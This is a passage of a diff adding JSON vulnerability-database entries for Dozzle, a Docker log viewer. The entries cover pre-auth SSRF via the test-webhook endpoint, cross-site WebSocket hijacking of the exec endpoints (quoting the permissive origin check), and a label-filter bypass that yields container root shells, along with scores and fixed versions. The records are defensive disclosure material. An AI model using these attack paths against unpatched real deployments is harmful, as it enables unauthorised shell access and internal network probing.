+          "type": "ghsa",
+          "id": "GHSA-p2w3-6x73-2f6x",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-p2w3-6x73-2f6x",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:e854440e71f3e5082fdd4e7b6b8d7bc950cd787d72cf2a8b83405188ee713e8a",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-45298",
+      "aliases": [
+        "GHSA-3v9w-6365-9w54"
+      ],
+      "title": "Dozzle: Pre-auth SSRF with response-body reflection via POST /api/notifications/test-webhook (default no-auth deploy)",
+      "summary": "Dozzle is a realtime log viewer for docker containers. Prior to 10.5.2, in a default dozzle deploy (the documented quickstart, no DOZZLE_AUTH_PROVIDER set), POST /api/notifications/test-webhook is reachable without authentication and forwards an attacker-controlled URL into a WebhookDispatcher that sends an HTTP POST to the supplied URL with attacker-controlled request headers, and returns the response status code AND up to 1MB of the response body to the caller, when the target replies non-2xx. This vulnerability is fixed in 10.5.2.",
+      "published_at": "2026-05-11T21:52:40.000Z",
+      "modified_at": "2026-06-08T23:35:23.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.6,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.01491,
+        "percentile": 0.74534,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "10.5.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-3v9w-6365-9w54",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v10.5.2",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45298",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-3v9w-6365-9w54",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-45298",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-45298",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-45298",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-45298",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-3v9w-6365-9w54",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-3v9w-6365-9w54",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:a52d57061b0312641a78b75e4eb25617a5469803d6618add74662ae9cfa2bf93",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-44985",
+      "aliases": [
+        "GHSA-j643-x8pv-8m67"
+      ],
+      "title": "Dozzle: Cross-Site WebSocket Hijacking (CSWSH) on exec/attach endpoints bypasses authentication",
+      "summary": "Dozzle is a realtime log viewer for docker containers. Prior to 10.5.2, he WebSocket upgrader for the /exec and /attach endpoints uses CheckOrigin: func(r *http.Request) bool { return true }, accepting upgrade requests from any origin. Combined with the JWT cookie using SameSite: Lax, this enables Cross-Site WebSocket Hijacking (CSWSH). An attacker hosting a page on a same-site origin (e.g., a sibling subdomain, or another service on localhost) can initiate a WebSocket connection to the exec endpoint that carries the victim's valid JWT cookie, gaining interactive shell access in any container the victim is authorized to access. This vulnerability is fixed in 10.5.2.",
+      "published_at": "2026-05-06T12:29:00.000Z",
+      "modified_at": "2026-06-08T23:35:14.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00209,
+        "percentile": 0.11193,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-346"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "10.5.2"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v10.5.2",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44985",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-j643-x8pv-8m67",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-44985",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-44985",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-44985",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-44985",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-j643-x8pv-8m67",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-j643-x8pv-8m67",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:a52d57061b0312641a78b75e4eb25617a5469803d6618add74662ae9cfa2bf93",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-24740",
+      "aliases": [
+        "GHSA-m855-r557-5rc5"
+      ],
+      "title": "Dozzle Agent Label-Based Access Control Bypass Allows Unauthorized Container Shell Access",
+      "summary": "Dozzle is a realtime log viewer for docker containers. Prior to version 9.0.3, a flaw in Dozzle’s agent-backed shell endpoints allows a user restricted by label filters (for example, `label=env=dev`) to obtain an interactive root shell in out‑of‑scope containers (for example, `env=prod`) on the same agent host by directly targeting their container IDs. Version 9.0.3 contains a patch for the issue.",
+      "published_at": "2026-01-26T16:22:59.000Z",
+      "modified_at": "2026-01-29T03:40:08.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00419,
+        "percentile": 0.36744,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-284",
+        "CWE-639",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "dozzle",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "9.0.3"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-m855-r557-5rc5",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/commit/620e59aa246347ba8a27e68c532853b8a5137bc1",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/amir20/dozzle/releases/tag/v9.0.3",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24740",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-m855-r557-5rc5",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-24740",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-24740",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-24740",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-24740",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-m855-r557-5rc5",
+          "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-m855-r557-5rc5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d3dfb51ef11f129e1e54480230c0da1dc0327972cd506085d237149d38e84144",
+      "note": null
+    }
+  ]
+}
